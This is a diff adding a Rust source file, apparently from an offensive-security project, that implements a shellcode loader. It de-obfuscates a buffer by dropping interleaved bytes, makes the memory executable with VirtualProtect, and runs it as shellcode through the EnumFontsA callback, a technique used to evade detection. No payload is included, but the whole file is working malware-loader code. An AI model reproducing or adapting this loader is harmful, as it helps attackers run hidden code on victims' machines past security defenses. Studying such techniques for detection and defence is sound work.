@@ -1,0 +1,53 @@
+use std::ptr::null_mut;
+
+use winapi::{ctypes::c_void, um::{errhandlingapi::GetLastError, memoryapi::VirtualProtect, wingdi::EnumFontsA, winuser::GetDC}};
+
+
+
+pub fn decrypt_shellcode(encrypted_shellcode: &[u8]) -> Vec<u8> {
+    encrypted_shellcode
+        .iter()
+        .enumerate()
+        .filter(|(i, _)| i % 2 == 0) // Keep every other byte (original bytes)
+        .map(|(_, &byte)| byte)
+        .collect()
+}
+
+pub fn sample_execute_shellcode(shellcode: &mut [u8]){
+        unsafe {
+            let mut old_protect = 0;
+    
+            // Change memory protection to PAGE_EXECUTE_READWRITE
+            let protect = VirtualProtect(
+                shellcode.as_mut_ptr() as *mut c_void,
+                shellcode.len(),
+                0x40, 
+                &mut old_protect,
+            );
+    
+            if protect == 0 {
+                eprintln!(
+                    "[-] Failed to change memory protection: {}",
+                    GetLastError()
+                );
+                return;
+            }
+    
+            println!("[+] Memory protection changed, executing shellcode...");
+    
+            // Execute shellcode via EnumFontsA
+            let result = EnumFontsA(
+                GetDC(null_mut()),             // Get the device context
+                std::ptr::null(),                        // Font name (null to enumerate all)
+                Some(std::mem::transmute(shellcode.as_ptr())), // Shellcode as callback
+                0,                             // lParam
+            );
+    
+            if result == 0 {
+                eprintln!("[-] EnumFontsA failed to execute the shellcode.");
+            } else {
+                println!("[+] Shellcode executed successfully.");
+            }
+        }
+    
+}
